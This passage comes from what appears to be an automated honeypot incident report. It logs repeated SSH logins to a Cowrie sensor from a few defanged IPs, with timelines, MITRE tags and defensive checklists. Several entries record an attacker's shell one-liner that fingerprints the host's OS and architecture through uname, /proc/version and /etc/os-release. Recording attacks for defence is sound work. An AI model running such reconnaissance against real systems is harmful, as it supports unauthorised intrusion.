| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:08:19` | `cowrie.session.connect` |
| `2026-07-05 10:08:20` | `cowrie.client.version` |
| `2026-07-05 10:08:20` | `cowrie.client.kex` |
| `2026-07-05 10:08:27` | `cowrie.login.success` |
| `2026-07-05 10:08:30` | `cowrie.session.params` |
| `2026-07-05 10:08:30` | `cowrie.command.input` |
| `2026-07-05 10:08:31` | `cowrie.log.closed` |
| `2026-07-05 10:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb7c20d6509

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 10:15 |
| **Last Seen** | 2026-07-05 10:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:15:25` | `cowrie.session.connect` |
| `2026-07-05 10:15:25` | `cowrie.client.version` |
| `2026-07-05 10:15:25` | `cowrie.client.kex` |
| `2026-07-05 10:15:26` | `cowrie.login.success` |
| `2026-07-05 10:15:27` | `cowrie.session.params` |
| `2026-07-05 10:15:27` | `cowrie.command.input` |
| `2026-07-05 10:15:27` | `cowrie.log.closed` |
| `2026-07-05 10:15:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-265673c0d2d3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 10:19 |
| **Last Seen** | 2026-07-05 10:19 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:19:23` | `cowrie.session.connect` |
| `2026-07-05 10:19:25` | `cowrie.client.version` |
| `2026-07-05 10:19:25` | `cowrie.client.kex` |
| `2026-07-05 10:19:30` | `cowrie.login.success` |
| `2026-07-05 10:19:35` | `cowrie.session.params` |
| `2026-07-05 10:19:35` | `cowrie.command.input` |
| `2026-07-05 10:19:36` | `cowrie.log.closed` |
| `2026-07-05 10:19:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b681635e282

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 10:30 |
| **Last Seen** | 2026-07-05 10:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:30:39` | `cowrie.session.connect` |
| `2026-07-05 10:30:40` | `cowrie.client.version` |
| `2026-07-05 10:30:40` | `cowrie.client.kex` |
| `2026-07-05 10:30:46` | `cowrie.login.success` |
| `2026-07-05 10:30:48` | `cowrie.session.params` |
| `2026-07-05 10:30:48` | `cowrie.command.input` |
| `2026-07-05 10:30:50` | `cowrie.log.closed` |
| `2026-07-05 10:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d756cb335a92

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 10:41 |
| **Last Seen** | 2026-07-05 10:42 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:41:52` | `cowrie.session.connect` |
| `2026-07-05 10:41:53` | `cowrie.client.version` |
| `2026-07-05 10:41:53` | `cowrie.client.kex` |
| `2026-07-05 10:41:59` | `cowrie.login.success` |
| `2026-07-05 10:42:02` | `cowrie.session.params` |
| `2026-07-05 10:42:02` | `cowrie.command.input` |
| `2026-07-05 10:42:03` | `cowrie.log.closed` |
| `2026-07-05 10:42:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9491b917a3d0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 10:42 |
| **Last Seen** | 2026-07-05 10:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:42:39` | `cowrie.session.connect` |
| `2026-07-05 10:42:39` | `cowrie.client.version` |
| `2026-07-05 10:42:39` | `cowrie.client.kex` |
| `2026-07-05 10:42:42` | `cowrie.login.success` |
| `2026-07-05 10:42:44` | `cowrie.session.params` |
| `2026-07-05 10:42:44` | `cowrie.command.input` |
| `2026-07-05 10:42:44` | `cowrie.command.input` |
| `2026-07-05 10:42:44` | `cowrie.command.input` |
| `2026-07-05 10:42:44` | `cowrie.command.input` |
| `2026-07-05 10:42:44` | `cowrie.command.input` |
| `2026-07-05 10:42:44` | `cowrie.command.success` |
| `2026-07-05 10:42:44` | `cowrie.command.input` |
| `2026-07-05 10:42:44` | `cowrie.command.input` |
| `2026-07-05 10:42:44` | `cowrie.command.input` |
| `2026-07-05 10:42:44` | `cowrie.command.input` |
| `2026-07-05 10:42:45` | `cowrie.log.closed` |
| `2026-07-05 10:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a305597a9278

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 10:44 |
| **Last Seen** | 2026-07-05 10:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:44:18` | `cowrie.session.connect` |
| `2026-07-05 10:44:18` | `cowrie.client.version` |
| `2026-07-05 10:44:18` | `cowrie.client.kex` |
| `2026-07-05 10:44:21` | `cowrie.login.success` |
| `2026-07-05 10:44:23` | `cowrie.session.params` |
| `2026-07-05 10:44:23` | `cowrie.command.input` |
| `2026-07-05 10:44:23` | `cowrie.command.input` |
| `2026-07-05 10:44:23` | `cowrie.command.input` |
| `2026-07-05 10:44:23` | `cowrie.command.input` |
| `2026-07-05 10:44:23` | `cowrie.command.input` |
| `2026-07-05 10:44:23` | `cowrie.command.success` |
| `2026-07-05 10:44:23` | `cowrie.command.input` |
| `2026-07-05 10:44:23` | `cowrie.command.input` |
| `2026-07-05 10:44:23` | `cowrie.command.input` |
| `2026-07-05 10:44:23` | `cowrie.command.input` |
| `2026-07-05 10:44:24` | `cowrie.log.closed` |
| `2026-07-05 10:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ce2c8593a9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 10:46 |
| **Last Seen** | 2026-07-05 10:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:46:07` | `cowrie.session.connect` |
| `2026-07-05 10:46:09` | `cowrie.client.version` |
| `2026-07-05 10:46:09` | `cowrie.client.kex` |
| `2026-07-05 10:46:12` | `cowrie.login.success` |
| `2026-07-05 10:46:14` | `cowrie.session.params` |
| `2026-07-05 10:46:14` | `cowrie.command.input` |
| `2026-07-05 10:46:14` | `cowrie.command.input` |
| `2026-07-05 10:46:14` | `cowrie.command.input` |
| `2026-07-05 10:46:14` | `cowrie.command.input` |
| `2026-07-05 10:46:14` | `cowrie.command.input` |
| `2026-07-05 10:46:14` | `cowrie.command.success` |
| `2026-07-05 10:46:14` | `cowrie.command.input` |
| `2026-07-05 10:46:14` | `cowrie.command.input` |
| `2026-07-05 10:46:14` | `cowrie.command.input` |
| `2026-07-05 10:46:14` | `cowrie.command.input` |
| `2026-07-05 10:46:15` | `cowrie.log.closed` |
| `2026-07-05 10:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a9b73523688

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 10:47 |
| **Last Seen** | 2026-07-05 10:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:47:53` | `cowrie.session.connect` |
| `2026-07-05 10:47:54` | `cowrie.client.version` |
| `2026-07-05 10:47:54` | `cowrie.client.kex` |
| `2026-07-05 10:47:58` | `cowrie.login.success` |
| `2026-07-05 10:48:00` | `cowrie.session.params` |
| `2026-07-05 10:48:00` | `cowrie.command.input` |
| `2026-07-05 10:48:00` | `cowrie.command.input` |
| `2026-07-05 10:48:00` | `cowrie.command.input` |
| `2026-07-05 10:48:00` | `cowrie.command.input` |
| `2026-07-05 10:48:00` | `cowrie.command.input` |
| `2026-07-05 10:48:00` | `cowrie.command.success` |
| `2026-07-05 10:48:00` | `cowrie.command.input` |
| `2026-07-05 10:48:00` | `cowrie.command.input` |
| `2026-07-05 10:48:00` | `cowrie.command.input` |
| `2026-07-05 10:48:00` | `cowrie.command.input` |
| `2026-07-05 10:48:01` | `cowrie.log.closed` |
| `2026-07-05 10:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63d1b60491b0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 10:49 |
| **Last Seen** | 2026-07-05 10:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:49:38` | `cowrie.session.connect` |
| `2026-07-05 10:49:38` | `cowrie.client.version` |
| `2026-07-05 10:49:38` | `cowrie.client.kex` |
| `2026-07-05 10:49:40` | `cowrie.login.success` |
| `2026-07-05 10:49:42` | `cowrie.session.params` |
| `2026-07-05 10:49:42` | `cowrie.command.input` |
| `2026-07-05 10:49:42` | `cowrie.command.input` |
| `2026-07-05 10:49:42` | `cowrie.command.input` |
| `2026-07-05 10:49:42` | `cowrie.command.input` |
| `2026-07-05 10:49:42` | `cowrie.command.input` |
| `2026-07-05 10:49:42` | `cowrie.command.success` |
| `2026-07-05 10:49:42` | `cowrie.command.input` |
| `2026-07-05 10:49:42` | `cowrie.command.input` |
| `2026-07-05 10:49:42` | `cowrie.command.input` |
| `2026-07-05 10:49:42` | `cowrie.command.input` |
| `2026-07-05 10:49:43` | `cowrie.log.closed` |
| `2026-07-05 10:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbe717d83de6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 10:52 |
| **Last Seen** | 2026-07-05 10:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:52:05` | `cowrie.session.connect` |
| `2026-07-05 10:52:05` | `cowrie.client.version` |
| `2026-07-05 10:52:05` | `cowrie.client.kex` |
| `2026-07-05 10:52:06` | `cowrie.login.success` |
| `2026-07-05 10:52:07` | `cowrie.session.params` |
| `2026-07-05 10:52:07` | `cowrie.command.input` |
| `2026-07-05 10:52:07` | `cowrie.log.closed` |
| `2026-07-05 10:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1168a0f4c26

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 10:52 |
| **Last Seen** | 2026-07-05 10:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:52:47` | `cowrie.session.connect` |
| `2026-07-05 10:52:48` | `cowrie.client.version` |
| `2026-07-05 10:52:48` | `cowrie.client.kex` |
| `2026-07-05 10:52:53` | `cowrie.login.success` |
| `2026-07-05 10:52:56` | `cowrie.session.params` |
| `2026-07-05 10:52:56` | `cowrie.command.input` |
| `2026-07-05 10:52:57` | `cowrie.log.closed` |
| `2026-07-05 10:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2249061e6bf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 10:52 |
| **Last Seen** | 2026-07-05 10:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:52:48` | `cowrie.session.connect` |
| `2026-07-05 10:52:49` | `cowrie.client.version` |
| `2026-07-05 10:52:49` | `cowrie.client.kex` |
| `2026-07-05 10:52:53` | `cowrie.login.success` |
| `2026-07-05 10:52:56` | `cowrie.session.params` |
| `2026-07-05 10:52:56` | `cowrie.command.input` |
| `2026-07-05 10:52:56` | `cowrie.command.input` |
| `2026-07-05 10:52:56` | `cowrie.command.input` |
| `2026-07-05 10:52:56` | `cowrie.command.input` |
| `2026-07-05 10:52:56` | `cowrie.command.input` |
| `2026-07-05 10:52:56` | `cowrie.command.success` |
| `2026-07-05 10:52:56` | `cowrie.command.input` |
| `2026-07-05 10:52:56` | `cowrie.command.input` |
| `2026-07-05 10:52:56` | `cowrie.command.input` |
| `2026-07-05 10:52:56` | `cowrie.command.input` |
| `2026-07-05 10:52:57` | `cowrie.log.closed` |
| `2026-07-05 10:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b4708c5e72d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 10:54 |
| **Last Seen** | 2026-07-05 10:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:54:23` | `cowrie.session.connect` |
| `2026-07-05 10:54:23` | `cowrie.client.version` |
| `2026-07-05 10:54:23` | `cowrie.client.kex` |
| `2026-07-05 10:54:26` | `cowrie.login.success` |
| `2026-07-05 10:54:28` | `cowrie.session.params` |
| `2026-07-05 10:54:28` | `cowrie.command.input` |
| `2026-07-05 10:54:28` | `cowrie.command.input` |
| `2026-07-05 10:54:28` | `cowrie.command.input` |
| `2026-07-05 10:54:28` | `cowrie.command.input` |
| `2026-07-05 10:54:28` | `cowrie.command.input` |
| `2026-07-05 10:54:28` | `cowrie.command.success` |
| `2026-07-05 10:54:28` | `cowrie.command.input` |
| `2026-07-05 10:54:28` | `cowrie.command.input` |
| `2026-07-05 10:54:28` | `cowrie.command.input` |
| `2026-07-05 10:54:28` | `cowrie.command.input` |
| `2026-07-05 10:54:29` | `cowrie.log.closed` |
| `2026-07-05 10:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-793c0b199dd2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 10:55 |
| **Last Seen** | 2026-07-05 10:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:55:50` | `cowrie.session.connect` |
| `2026-07-05 10:55:51` | `cowrie.client.version` |
| `2026-07-05 10:55:51` | `cowrie.client.kex` |
| `2026-07-05 10:55:53` | `cowrie.login.success` |
| `2026-07-05 10:55:55` | `cowrie.session.params` |
| `2026-07-05 10:55:55` | `cowrie.command.input` |
| `2026-07-05 10:55:55` | `cowrie.command.input` |
| `2026-07-05 10:55:55` | `cowrie.command.input` |
| `2026-07-05 10:55:55` | `cowrie.command.input` |
| `2026-07-05 10:55:55` | `cowrie.command.input` |
| `2026-07-05 10:55:55` | `cowrie.command.success` |
| `2026-07-05 10:55:55` | `cowrie.command.input` |
| `2026-07-05 10:55:55` | `cowrie.command.input` |
| `2026-07-05 10:55:55` | `cowrie.command.input` |
| `2026-07-05 10:55:55` | `cowrie.command.input` |
| `2026-07-05 10:55:56` | `cowrie.log.closed` |
| `2026-07-05 10:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7920de6f8a41

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 10:57 |
| **Last Seen** | 2026-07-05 10:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:57:14` | `cowrie.session.connect` |
| `2026-07-05 10:57:15` | `cowrie.client.version` |
| `2026-07-05 10:57:15` | `cowrie.client.kex` |
| `2026-07-05 10:57:17` | `cowrie.login.success` |
| `2026-07-05 10:57:19` | `cowrie.session.params` |
| `2026-07-05 10:57:19` | `cowrie.command.input` |
| `2026-07-05 10:57:19` | `cowrie.command.input` |
| `2026-07-05 10:57:19` | `cowrie.command.input` |
| `2026-07-05 10:57:19` | `cowrie.command.input` |
| `2026-07-05 10:57:19` | `cowrie.command.input` |
| `2026-07-05 10:57:19` | `cowrie.command.success` |
| `2026-07-05 10:57:19` | `cowrie.command.input` |
| `2026-07-05 10:57:19` | `cowrie.command.input` |
| `2026-07-05 10:57:19` | `cowrie.command.input` |
| `2026-07-05 10:57:19` | `cowrie.command.input` |
| `2026-07-05 10:57:19` | `cowrie.log.closed` |
| `2026-07-05 10:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8fb98ff5831

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 10:58 |
| **Last Seen** | 2026-07-05 10:58 |
